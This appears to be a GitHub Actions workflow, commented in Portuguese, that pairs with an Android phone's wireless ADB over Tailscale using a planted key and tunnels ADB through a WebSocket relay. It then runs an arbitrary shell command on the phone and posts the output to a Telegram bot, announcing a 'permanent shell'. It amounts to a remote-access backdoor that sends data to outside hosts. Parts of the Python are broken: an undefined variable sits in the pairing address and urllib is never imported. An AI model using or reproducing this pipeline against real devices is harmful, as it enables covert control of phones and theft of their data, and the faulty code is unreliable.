name: GH-KALI PairPipe (parear + tubo classico na mesma run)
run-name: pairpipe g52
on:
  workflow_dispatch:
    inputs:
      alvo:
        description: "IP tailnet do aparelho (100.x.y.z)"
        required: true
      porta_par:
        description: "Porta de PAREAMENTO (visor)"
        required: true
      codigo:
        description: "Codigo de pareamento (6 digitos)"
        required: true
      comando:
        description: "Comando shell"
        required: true
        default: "id"
jobs:
  pairpipe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Tailscale
        uses: tailscale/github-action@v2
        with:
          authkey: ${{ secrets.TAILSCALE_AUTHKEY }}
          version: 1.78.1
      - name: platform-tools 33.0.3
        run: |
          curl -sL -m 300 -o /tmp/pt.zip https://dl.google.com/android/repository/platform-tools_r33.0.3-linux.zip
          unzip -q /tmp/pt.zip -d /tmp
      - name: Planta a chave da casa
        run: |
          mkdir -p ~/.android
          cp tools/adbkey ~/.android/adbkey
          cp tools/adbkey.pub ~/.android/adbkey.pub
          chmod 600 ~/.android/adbkey
          echo "chave da casa plantada"
      - name: Aguarda o servico de pareamento abrir
        timeout-minutes: 5
        run: |
          for i in $(seq 1 60); do
            nc -z -w2 ${{ inputs.alvo }} ${{ inputs.porta_par }} 2>/dev/null && { echo "PORTA ABERTA ($i)"; exit 0; }
            sleep 5
          done
          echo "porta nunca abriu"; exit 1
      - name: Parear com a chave da casa
        run: |
          A=/tmp/platform-tools/adb
          ok=0
          for t in 1 2 3; do
            if echo '${{ inputs.codigo }}' | $A pair ${{ inputs.alvo }}:${{ inputs.porta_par }}; then ok=1; break; fi
            sleep 3
          done
          if [ "$ok" != "1" ]; then echo "PAREAMENTO FALHOU"; exit 1; fi
          echo "PAREADO COM A CHAVE DA CASA"
      - name: Status
        run: |
          echo "pareamento registrado no adbd — pronto pra conexoes futuras com a chave da casa"
      - name: Aviso no Telegram
        if: always()
        run: |
          curl -s -F text="chave da casa pareada — shell permanente ativo" "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage" -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" > /dev/null

      - name: Pareia + sobe ponte + executa (mesma maquina, confianca fresca)
        run: |
          mkdir -p ~/.android
          cp tools/adbkey ~/.android/adbkey
          cp tools/adbkey.pub ~/.android/adbkey.pub
          chmod 600 ~/.android/adbkey
          export PATH=/tmp/platform-tools:$PATH
          pip install -q websocket-client
          ALVO="${{ inputs.alvo }}"
          PORTA_PAR="${{ inputs.porta_par }}"
          CODIGO="${{ inputs.codigo }}"
          COMANDO="${{ inputs.comando }}"
          python3 - "$ALVO" "$PORTA_PAR" "$CODIGO" "$COMANDO" <<'PYEOF'
          import base64, json, os, socket, subprocess, sys, threading, time
          import websocket
          alvo, porta_par, codigo, comando = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
          os.chdir(os.environ.get("GITHUB_WORKSPACE", "."))

          def adb(*args):
              return subprocess.run(["/tmp/platform-tools/adb"] + list(args),
                                    capture_output=True, text=True, timeout=40)

          print("== 1/4 pareando ==", flush=True)
          r = adb("pair", f"${ALVO}:{porta_par}", codigo)
          print(r.stdout + r.stderr, flush=True)

          print("== 2/4 pedindo pipe ao app ==", flush=True)
          url = "wss://sino-relay.worldeffects752.workers.dev/ws?id=g52"
          ws = websocket.create_connection(url, header=["X-Role: manda"], timeout=30)
          t0 = time.time()
          pipe_ok = False
          while time.time() - t0 < 150 and not pipe_ok:
              try:
                  m = json.loads(ws.recv())
              except Exception:
                  break
              if m.get("type") == "joined":
                  if m.get("peers", 0) >= 2:
                      ws.send(json.dumps({"cmd": "pipe"}))
                  continue
              if m.get("type") == "pipe" and m.get("status") == "ok":
                  pipe_ok = True
          print("pipe_ok:", pipe_ok, flush=True)

          print("== 3/4 ponte TCP<->WS ==", flush=True)
          prox = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          prox.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
          prox.bind(("127.0.0.1", 15555))
          prox.listen(4)
          def bridge():
              try:
                  cli, _ = prox.accept()
                  cli.settimeout(None)
                  def tcp2ws():
                      try:
                          while True:
                              d = cli.recv(65536)
                              if not d: break
                              ws.send(d)
                      except Exception: pass
                  def ws2tcp():
                      try:
                          while True:
                              m = ws.recv()
                              if isinstance(m, bytes):
                                  cli.sendall(m)
                      except Exception: pass
                  threading.Thread(target=tcp2ws, daemon=True).start()
                  threading.Thread(target=ws2tcp, daemon=True).start()
              except Exception as e:
                  print("proxy:", e, flush=True)
          threading.Thread(target=bridge, daemon=True).start()

          print("== 4/4 connect + comando ==", flush=True)
          saida = ""
          for tent in range(10):
              adb("connect", "127.0.0.1:15555")
              time.sleep(2)
              rr = adb("-s", "127.0.0.1:15555", "shell", comando)
              saida = (rr.stdout + rr.stderr).strip()
              print(f"tentativa {tent}: {saida[:300]}", flush=True)
              if "uid=" in saida:
                  break
              adb("disconnect", "127.0.0.1:15555")
              time.sleep(3)
          ws.close()
          print("SAIDA_FINAL:", saida[:500], flush=True)
          req = urllib.request.Request(
              f"https://api.telegram.org/bot{os.environ['TG_TOKEN']}/sendMessage",
              data=json.dumps({"chat_id": os.environ["TG_CHAT"], "text": "PAIRPIPE:\n" + saida[:600]}).encode(),
              headers={"Content-Type": "application/json"})
          print(urllib.request.urlopen(req, timeout=15).read().decode()[:100], flush=True)
          PYEOF
        env:
          TG_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
          TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
